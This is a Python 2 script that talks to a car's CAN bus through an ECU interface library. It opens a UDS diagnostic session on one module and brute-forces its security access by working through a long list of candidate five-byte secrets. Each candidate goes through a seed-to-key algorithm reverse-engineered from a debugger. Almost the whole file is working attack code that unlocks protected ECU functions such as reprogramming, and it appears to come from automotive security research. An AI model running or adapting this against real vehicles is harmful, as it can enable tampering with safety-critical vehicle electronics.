from ctypes import *
import time
import sys

class SFFMessage(Structure):
    _fields_ = [("IDH", c_ubyte),
                ("IDL", c_ubyte),
                ("data", c_ubyte * 8),
                ("options", c_ubyte),
                ("DataLength", c_ubyte),
                ("TimeStamp", c_uint),
                ("baud", c_ubyte)]



keybag = [
"00 00 00 00 00",
"AA 77 5C 45 B7",
"79 69 96 56 B6",
"1A 12 D3 98 49",
"76 66 84 57 8C",
"76 66 84 57 8C",
"88 99 96 6A 5C",
"98 97 68 77 AA",
"93 46 98 48 B9",
"96 99 56 94 85",
"9C CA 8A 7A 37",
"79 B6 8C A4 64",
"79 69 96 56 B6",
"17 7B 6A 96 74",
"7B 73 77 6A A5",
"A8 6B 9C 87 68",
"98 85 98 77 A9",
"27 76 76 59 C6",
"75 37 BB D8 89",
"87 C8 8B 77 A6",
"34 D9 52 C9 42",
"7D D0 C4 76 62",
"6A A5 68 56 5E",
"49 BE 98 2A 14",
"08 30 61 55 AA",
"08 30 61 55 AA",
"53 67 98 B3 A4",
"B3 97 C8 6A 37",
"06 F9 04 9E 65",
"B6 E3 D7 7C 3D",
"92 77 6B 88 77",
"7B 87 89 9B 57",
"38 89 85 87 3A",
"9A B6 99 6C 9A",
"78 77 68 6B 53",
"77 87 A5 86 A3",
"5C 55 28 9B 6D",
"D1 F3 2D 91 4B",
"23 11 D2 A2 67",
"99 77 88 88 77",
"A7 6C B2 79 AA",
"94 87 A9 A6 7A",
"AA 76 88 6B A7",
"B3 B3 23 03 A6",
"6D 82 30 71 01",
"96 87 88 94 A8",
"97 7A D9 3C 82",
"06 F9 04 9E 65",
"B6 E3 D7 7C 3D",
"30 04 AA 9A 7A",
"51 1B 53 74 74",
"B5 0A B4 96 2C",
"A2 A3 AC CA 50",
"85 77 C8 65 36",
"59 5B 58 72 52",
"20 AC 71 5F F7",
"3C E2 DB 41 9A",
"83 55 07 51 9A",
"42 43 4D 59 32",
"44 49 4F 44 45",
"58 35 82 C8 1D",
"3F 43 EF 74 BE",
"E8 D2 06 6D DC",
"71 48 77 B2 4B",
"1D 61 E5 C7 0D",
"06 4E 9A E1 DE",
"6C 2E A0 71 E6",
"89 D5 7F B3 A7",
"AA CC CC 33 55",
"AA CC CC 33 55",
"76 C4 7F E5 00",
"76 C4 7F E5 00",
"47 A7 3B 83 62",
"47 A7 3B 83 62",
"B3 14 F1 1A 05",
"08 1A 78 BB E7",
"B3 14 F1 1A 05",
"08 1A 78 BB E7",
"08 53 AC DE 3D",
"51 9A 72 13 1C",
"E7 29 D1 4B 41",
"F6 92 02 44 E0",
"76 66 84 57 8C",
"76 66 84 57 8C",
"4F 53 4E 45 44",
"4F 53 4E 45 44",
"E7 29 D1 4B 41",
"F6 92 02 44 E0",
"AA 7C 3A BD D9",
"DC 0D E5 B1 AB",
"6C 5A B3 C7 8B",
"B2 6D 74 9A 57",
"5F 7D F5 F7 93",
"9D 6C C3 12 BB",
"E6 A4 02 D1 6A",
"31 32 33 34 35",
"31 32 33 34 35",
"AB DC 74 45 C6",
"06 C3 03 6B 0B",
"85 EF F9 F5 DC",
"33 59 00 29 8A",
"A5 B3 EF DA 76",
"07 F5 6A F9 47",
"06 F9 04 9E 65",
"B6 E3 D7 7C 3D",
"96 87 88 94 A8",
"97 7A D9 3C 82",
"AE C7 B4 4B AC",
"64 06 D6 A6 C0",
"3D 80 49 83 B3",
"A5 FD 4C 45 DA",
"FD B3 F4 35 88",
"8A 81 A8 88 82",
"65 77 78 04 12",
"65 77 78 04 12",
"00 00 00 00 00",
"4D 61 7A 64 41",
"01 01 01 01 01",
"12 17 01 E3 94",
"41 82 F6 78 EE",
"C3 A1 09 77 14",
"2E 67 CB 8A 03",
"CA 5B 1B 48 AF",
"DE B4 77 27 04",
"7B 03 C9 22 F1",
"41 52 49 41 4E",
"08 30 61 A4 C5",
"4A 65 73 75 73",
"13 4B 7C F3 5C",
"52 45 4D 41 54",
"54 41 4D 45 52",
"97 62 79 84 EC",
"41 57 54 43 55",
"08 30 61 55 AA",
"08 24 76 01 11",
"41 AA 42 BB 43",
"3A 62 93 D6 F7",
"2E 67 CB 8A 30",
"12 23 34 45 56",
"AD D9 A2 67 75",
"AA BB CC DD EE",
"05 B7 06 25 03",
"11 41 02 98 E3",
"2D 86 C5 57 A1",
"41 49 53 49 4E",
"61 EB AD C6 24",
"3F 43 EF 74 BE",
"46 6E 74 63 4D",
"44 67 AA F2 07",
"22 7B 3F 23 77",
"FE 42 28 D3 AD",
"45 4D 45 31 53",
"54 52 4F 48 53",
"CE 08 91 A6 43",
"34 1F 3C FB C5",
"31 49 21 63 27",
"52 6F 77 61 6E",
"24 68 86 42 04",
"F7 32 D7 3A 12",
"F4 79 1A 60 CB",
"5A 3B 51 4A 35",
"2C D8 73 A9 14",
"16 17 01 08 15",
"44 52 49 46 54",
"C5 A4 61 A4 A7",
"83 55 07 51 9A",
"08 30 55 61 AA",
"48 41 5A 45 4C",
"7D 2D 20 05 78",
"24 31 DE F9 46",
"01 23 45 67 89",
"A3 B2 C0 14 92",
"CB 41 12 28 71",
"C4 14 02 11 05",
"1E 08 17 1B 72",
"01 09 FF 19 64",
"15 1F 52 1F 7F",
"0C 04 49 15 62",
"1C 27 50 76 77",
"01 68 A4 78 A1",
"57 A2 F7 C3 49",
"16 7E 04 CF F5",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"00 00 00 00 00",
"19 AC 3A 1C C2",
"3A 8E CF 9C CE",
"65 77 78 04 12",
"3F 3A 2F 21 01",
"F8 A9 5F 1D 01",
"35 E7 FA 6D D1",
"0A 6D C1 3B 20",
"22 A1 60 51 A9",
"0D 5A DB DF CA",
"9F 75 4B 3B 87",
"22 5F B4 AC 54",
"F4 31 0F B2 52",
"29 64 B2 72 C2",
"F8 39 12 96 0E",
"41 AA 42 BB 43",
"41 AA 42 BB 43",
"AA 5A 35 BE D4",
"96 A2 3B 83 9B",
"C8 9B 10 48 8D",
"75 B1 56 83 4A",
"9F 75 4B 3B 87",
"48 87 29 88 9D",
"5E 18 BF 9B 75",
"A6 37 9E 84 34",
"11 4D 87 75 AF",
"0E AA 0B A0 16",
"F5 1E 14 87 C0",
"1C F0 00 C1 0A",
"58 05 3E 45 9C",
"6A A5 68 56 5E",
"42 43 4D 59 32",
"45 55 43 44 31",
"45 55 43 44 31",
"88 99 96 6A 5C",
"98 97 68 77 AA",
"96 A2 3B 83 9B",
"DC D5 44 7A E6",
"DC D5 44 7A E6",
"08 30 61 55 AA",
"08 30 61 55 AA",
"54 4F 42 42 45",
"54 4F 42 42 45",
"48 53 54 43 4D",
"48 53 54 43 4D",
"1F 1A 4F 3E E6",
"1F 1A 4F 3E E6",
"41 AA 42 BB 43",
"41 AA 42 BB 43",
"15 24 33 42 51",
"15 24 33 42 51",
"01 23 45 67 89",
"18 AE 78 4A D2",
"45 55 43 44 31",
"45 55 43 44 31",
"C9 EA 84 CB 10",
"25 92 CA 34 29",
"53 67 98 B3 A4",
"08 30 61 55 AA",
"08 30 61 55 AA",
"FA 6B 5A 70 47",
"08 30 61 55 AA",
"00 00 00 00 00",
"FF FF FF FF FF",
"AC 03 14 89 E3",
"AC F7 29 92 E1",
"08 30 61 55 AA",
"DD 16 1A 48 AF",
"49 76 66 65 52",
"08 28 21 16 63",
"0A 16 04 07 B6",
"1B 44 14 4D 24",
"22 05 12 09 06",
"41 51 26 84 11",
"48 12 A6 D5 7B",
"4A 36 31 43 46",
"4E 53 59 4E 53",
"50 61 44 6D 41",
"5F 9C 99 A3 50",
"6A 55 68 51 5E",
"6E 6F 77 61 52",
"88 6D 91 75 7D",
"D8 41 5D 77 A5",
"4C 75 70 69 6E",
"8C 00 00 00 00",
"8C 54 F8 0B D7",
"53 48 4F 57 41",
"47 76 66 65 52",
"26 8C B4 71 EE",
"AB 7D D1 D2 71",
"8C F5 A5 19 EE",
"69 69 B6 53 A1",
"4C 43 41 42 4C",
"26 81 45 29 7D",
"28 81 45 29 7D",
"DA CC CB 6E B3",
"43 4F 4C 49 4E",
"16 B9 13 77 70",
"4D 48 65 71 79",
"62 48 C5 A2 5F",
"5A 89 E4 41 72",
"42 72 61 64 57",
"4A 61 6E 69 73",
"8A 78 90 34 F7",
"50 C8 6A 49 F1",
"02 25 19 77 07",
"01 02 03 04 05",
"24 87 64 70 32",
"24 87 64 65 85",
"61 42 2B 54 64",
"16 65 2C EA BE",
"8C 4A D2 1F 2E",
"DC 40 0A 59 23",
"83 9E E2 12 E0",
"46 4D 43 30 31",
"C1 B0 CA D0 1A",
"38 07 8A 63 C1",
"B8 3F 24 7F FF",
"53 4B 65 21 AD",
"27 A1 2B 19 83",
"84 66 08 62 AB",
"A3 13 07 04 7D",
"64 56 36 4C A7",
"11 22 33 44 55",
"00 00 00 00 00",
"83 6A CF 36 1B",
"03 D6 B5 D7 6F",
"8C 02 0D 04 5F",
"98 4B 94 08 E7",
"08 03 61 55 AA",
"62 4B 94 08 E7",
"88 2A 7B 93 36",
"DF 3A 14 69 C2",
"04 06 07 04 09",
"05 3C 70 3A 75",
"E1 84 BE 23 29",
"A3 C1 E4 19 89",
"71 55 21 A5 5E",
"86 9A 78 4D 90",
"71 55 21 5E A5",
"71 55 21 41 C2",
"42 D3 6E 34 CE",
"42 DD 6E 34 CE",
"83 57 07 33 9A",
"88 2A 7B 93 54",
"13 F1 29 B3 01",
"5B 41 74 65 7D",
"50 C8 6A 49 F2",
"A7 C2 E9 19 92",
"A7 C2 E9 2C 7A",
"44 DD 45 EE 46",
"20 4A FE 9C 2D",
"31 63 46 66 48",
"E9 D4 A1 12 01",
"42 6F 73 63 68",
"37 E1 A2 15 C8",
"6B A7 43 0A 71",
"16 27 38 49 5A",
"6F 6E 69 62 68",
"62 68 61 77 6E",
"61 5F 62 61 64",
"5C EB 11 7B 30",
"00 1D 46 0F 63",
"71 18 A5 68 68",
"C8 B2 E3 9E 76",
"FD 4C 92 81 ED",
"71 18 41 69 68",
"3F 37 5F 22 59",
"4E 8A E2 CA D8",
"65 38 74 36 31",
"B6 45 17 77 D3",
"21 A4 39 6C 04",
"0A 1E 05 14 C2",
"7C 70 D0 30 C1",
"63 6F 6E 74 69",
"6B A7 24 0A 71",
"1A 2B 3C 4D 5E",
"F3 11 45 4C 73",
"17 46 CE B4 35",
"9A 78 56 34 12",
"76 AB 51 09 45",
"34 23 39 11 77",
"41 51 26 84 01",
"24 03 35 63 84",
"84 08 F5 77 01",
"19 82 06 10 03",
"42 4F 53 45 58",
"66 6F 61 77 65",
"53 55 4D 2D 33",
"12 13 19 76 30",
"42 A4 83 99 79",
"EF E5 7A 91 6A",
"19 D3 0B 2F D2",
"14 20 E6 89 0A",
"5E 10 0F 46 33",
"15 71 03 19 76",
"66 AF 30 06 12",
"20 E4 48 E1 D1",
"28 E2 22 63 5F",
"08 31 61 A4 C5",
"E6 76 3F ED 74",
"4A 41 4D 45 53",
"08 08 01 03 01",
"54 75 BC 4E 68",
"4D 41 5A 44 41",
"4B 30 32 31 36",
"6D 41 5A 44 61",
"62 1C 06 72 60",
"50 41 4E 44 41",
"21 27 03 DA 27",
"22 70 EA 4C 11",
"46 6C 61 73 68"]

def key_from_seed(seed, secret):
    
#    print "Observed seed: "+seed
    #
    # This is the "secret" found in debugger
    #
    s1 = int(secret[0:2],16)
    s2 = int(secret[3:5],16)
    s3 = int(secret[6:8],16)
    s4 = int(secret[9:11],16)
    s5 = int(secret[12:14],16)

    # PCM
    #s1 = 0x08
    #s2 = 0x30
    #s3 = 0x61
    #s4 = 0xa4
    #s5 = 0xc5

    seed_int = (int(seed[0:2],16)<<16) + (int(seed[3:5],16)<<8) + (int(seed[6:8],16)) 
    or_ed_seed = ((seed_int & 0xFF0000) >> 16) | (seed_int & 0xFF00) | (s1 << 24) | (seed_int & 0xff) << 16
    mucked_value = 0xc541a9

    for i in range(0,32):
        a_bit = ((or_ed_seed >> i) & 1 ^ mucked_value & 1) << 23
        v9 = v10 = v8 = a_bit | (mucked_value >> 1);
        mucked_value = v10 & 0xEF6FD7 | ((((v9 & 0x100000) >> 20) ^ ((v8 & 0x800000) >> 23)) << 20) | (((((mucked_value >> 1) & 0x8000) >> 15) ^ ((v8 & 0x800000) >> 23)) << 15) | (((((mucked_value >> 1) & 0x1000) >> 12) ^ ((v8 & 0x800000) >> 23)) << 12) | 32 * ((((mucked_value >> 1) & 0x20) >> 5) ^ ((v8 & 0x800000) >> 23)) | 8 * ((((mucked_value >> 1) & 8) >> 3) ^ ((v8 & 0x800000) >> 23));

    for j in range(0,32):
        a_bit = ((((s5 << 24) | (s4 << 16) | s2 | (s3 << 8)) >> j) & 1 ^ mucked_value & 1) << 23;
        v14 = v13 = v12 = a_bit | (mucked_value >> 1);
	mucked_value = v14 & 0xEF6FD7 | ((((v13 & 0x100000) >> 20) ^ ((v12 & 0x800000) >> 23)) << 20) | (((((mucked_value >> 1) & 0x8000) >> 15) ^ ((v12 & 0x800000) >> 23)) << 15) | (((((mucked_value >> 1) & 0x1000) >> 12) ^ ((v12 & 0x800000) >> 23)) << 12) | 32 * ((((mucked_value >> 1) & 0x20) >> 5) ^ ((v12 & 0x800000) >> 23)) | 8 * ((((mucked_value >> 1) & 8) >> 3) ^ ((v12 & 0x800000) >> 23));

    key = ((mucked_value & 0xF0000) >> 16) | 16 * (mucked_value & 0xF) | ((((mucked_value & 0xF00000) >> 20) | ((mucked_value & 0xF000) >> 8)) << 8) | ((mucked_value & 0xFF0) >> 4 << 16);

#    print "Computed key: %x" % key
#    return "%02X %02X %02X" % ( (key & 0xff0000) >> 16, (key & 0xff00) >> 8, key & 0xff) 
    return [(key & 0xff0000) >> 16, (key & 0xff00) >> 8, key & 0xff]



def data_to_line(data, linelen):
	line = ''
	x = 0
	while x < len(data):
		line += "%02X " % data[x]
		x += 1

	while x < linelen:
		line += "00 "
		x += 1

	return line


#
# This function sends data using ISO TP and reads the response using ISO TP
#
def send_data(mydll, handle, wid, data):
	yy = pointer(SFFMessage())
	idh = (wid & 0xff00) >> 8
	idl = (wid & 0xff)

	# multi packet send
	if len(data) > 7:
#                print "Long data"
		# first packet
		datalen = len(data)
		byteone = 0x10 + (0xf00 & datalen)
		bytetwo = 0xff & datalen
		firstdata = [byteone, bytetwo] + data[0:6]
		line = "IDH: %02X, IDL: %02X, Len: 08, Data: " % (idh, idl)
                line += data_to_line(firstdata, 8)
                mydll.DbgLineToSFF(line, yy)
                mydll.PrintSFF(yy,0)
                mydll.write_message(handle, yy)
		# resp
                read_by_wid = mydll.read_message_by_wid_with_timeout
                read_by_wid.restype = POINTER(SFFMessage)
        	z = mydll.read_message_by_wid_with_timeout(handle, wid+8, 1000)
		sent = 6
		counter = 0
        	mydll.PrintSFF(z,0)
		if z.contents.data[0] != 0x30:
			print "Bad response"
			return []

		# rest
		while sent < datalen:
			firstbyte = 0x20 + ((counter+1) & 0xf)
			firstdata = [firstbyte] + data[6 + counter*7 : 13 + counter*7]
			line = "IDH: %02X, IDL: %02X, Len: 08, Data: " % (idh, idl)
                	line += data_to_line(firstdata, 8)
                	mydll.DbgLineToSFF(line, yy)
                	mydll.PrintSFF(yy,0)
                	mydll.write_message(handle, yy)
			sent += 7
			counter += 1
	else:
		# single packet send
		line = "IDH: %02X, IDL: %02X, Len: 08, Data: %02x " % (idh, idl, len(data))
		line += data_to_line(data, 8) 
		mydll.DbgLineToSFF(line, yy)
		mydll.PrintSFF(yy,0)
    		mydll.write_message(handle, yy)


	# get response
    	read_by_wid = mydll.read_message_by_wid_with_timeout
    	read_by_wid.restype = POINTER(SFFMessage)
    	z = mydll.read_message_by_wid_with_timeout(handle, wid+8, 1000)
    	
	if not z:
		return []

        mydll.PrintSFF(z,0)
    	first_byte = z.contents.data[0]

    	if first_byte < 0x8:
            # is it a slow operation?
            while z.contents.data[1] == 0x7f and z.contents.data[3] == 0x78:
                time.sleep(.1)
                z = mydll.read_message_by_wid_with_timeout(handle, wid+8, 1000)
                if not z:
                    return []
                mydll.PrintSFF(z,0)
	    return z.contents.data[1:]

	toread = ((first_byte & 0xf) << 8) + z.contents.data[1]
	total_to_read = toread
        toread -= 6
	ret = z.contents.data[2:]
        mydll.DbgLineToSFF("IDH: %02X, IDL: %02X, Len: 08, Data: 30 00 00 00 00 00 00 00" % (idh, idl), yy)
        mydll.PrintSFF(yy,0)
        mydll.write_message(handle, yy)
        while( toread > 0 ):
            	z = mydll.read_message_by_wid_with_timeout(handle, wid+8, 1000)
            	toread -= 7
		ret += z.contents.data[1:]
            	mydll.PrintSFF(z,0)
    	return ret[:total_to_read]

def do_diagnostic_session(mydll, handle, wid):
    ret = send_data(mydll, handle, wid, [0x10,3])
    if not ret:
        print "No response"
        return False
    if ret[0] == 0x50:
        return True
    # try 80 one:
    ret = send_data(mydll, handle, wid, [0x10,0x85])
    if not ret:
        print "No response"
        return False
    if ret[0] == 0x50:
        return True
    if ret[2] == 0x78:
    	read_by_wid = mydll.read_message_by_wid_with_timeout
    	read_by_wid.restype = POINTER(SFFMessage)
    	z = mydll.read_message_by_wid_with_timeout(handle, wid+8, 1000)
        mydll.PrintSFF(z,0)
        if z.contents.data[1] == 0x50:
            return True
    print "Couldn't start diagnostic session"
    return False




# returns if it ran test okay.  Exits if it finds the right guy
def do_security_access(mydll, handle, wid, secret):
        seed = send_data(mydll, handle, wid, [0x27,1])
        if not seed:
                print "no response"
                return False
        strseed = ''
        for x in seed:
                strseed += "%02X " % x
        key = key_from_seed(strseed[6:], secret)
        ret = send_data(mydll, handle, wid, [0x27,2]+key)
        if not ret:
                print "No repsonse"
                return False
        elif ret[0] == 0x67:
                print "Found it: " + secret
                sys.exit(0)
        elif ret[0] == 0x7f and ret[1] == 0x27:
                print "Not it for " + secret + "error %x" % (ret[2])
                return True
        else:
                print "Weird response"
                return False




# returns if it ran test okay.  Exits if it finds the right guy
def do_security_access_stage2(mydll, handle, wid, secret1, secret2):
#	seed = send_data(mydll, handle, wid, [0x27,1])
#    	if not seed:
#        	print "no response"
#        	return False
#    	strseed = ''
#    	for x in seed:
#		strseed += "%02X " % x
#    	key = key_from_seed(strseed[6:], secret1)
#    	ret = send_data(mydll, handle, wid, [0x27,2]+key)
#    	if not ret:
#        	print "No repsonse"
#		return False
#	elif ret[0] == 0x7f and ret[1] == 0x27:
#		print "real key1 didn't work"
#		return False

	## second stage
        seed = send_data(mydll, handle, wid, [0x27,3])
        if not seed:
                print "no response"
                return False
        strseed = ''
        for x in seed:
                strseed += "%02X " % x
        key = key_from_seed(strseed[6:], secret2)
        ret = send_data(mydll, handle, wid, [0x27,4]+key)
        if not ret:
                print "No repsonse"
                return False
        elif ret[0] == 0x67:
                print "Found it: " + secret2
                sys.exit(0)
        elif ret[0] == 0x7f and ret[1] == 0x27:
                print "Not it for " + secret2 + "error %x" % (ret[2])
                return True
        else:
                print "Weird response"
                return False


# initalize
mydll = CDLL('Debug\\ecomcat_api')
# HS CAN
#handle = mydll.open_device(1,0)
# MS
handle = mydll.open_device(3,0)

wid = 0x726

#raw_input("make sure car is in bootrom mode, use CarDaqPlusCat")
if do_diagnostic_session(mydll, handle, wid):
    print "Started diagnostic session"
#do_security_access(mydll, handle, wid, "5B 41 74 65 7D",keybag[0])

for secret in keybag:
	doneyet = False
	while not doneyet:
		doneyet = do_security_access(mydll, handle, wid, secret)

mydll.close_device(handle)
